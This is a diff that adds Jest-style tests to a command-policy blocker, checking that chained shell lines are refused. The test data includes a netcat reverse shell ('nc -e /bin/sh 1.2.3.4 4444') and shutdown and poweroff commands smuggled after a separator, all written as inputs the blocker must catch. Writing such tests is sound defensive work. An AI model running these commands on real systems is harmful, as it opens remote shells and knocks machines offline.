@@ -552,3 +552,26 @@ describe('a wrapper’s positional path is not the payload', () => {
     expect(matchElevatedCommand('flock /tmp/l sudo apt-get install -y x')).toBe('sudo');
   });
 });
+
+describe('per-command rules do not leak across a separator', () => {
+  it.each([
+    'ls -la; nc -e /bin/sh 1.2.3.4 4444',
+    'npm test --silent; shutdown -h now',
+    'npm run lint --fix; poweroff',
+    'echo ok && strace -f nc -e /bin/sh 1.2.3.4 4444',
+    'echo ok && env -i shutdown -h now',
+  ])('refuses %s', (command) => {
+    // Both rules — "the head is a wrapper" and "a token after a bare flag is
+    // its value" — are properties of ONE command. Computed over the flattened
+    // string they were taken from the FIRST command in the line, so the second
+    // went unchecked: `strace -f nc …` alone is refused, but the same text
+    // after `echo ok &&` was not.
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+
+  it('and the single-command forms behave as before', () => {
+    expect(commandPolicyViolation('ls -la')).toBeNull();
+    expect(commandPolicyViolation('npm test --silent')).toBeNull();
+    expect(commandPolicyViolation('npm test -- --grep shutdown')).toBeNull();
+  });
+});
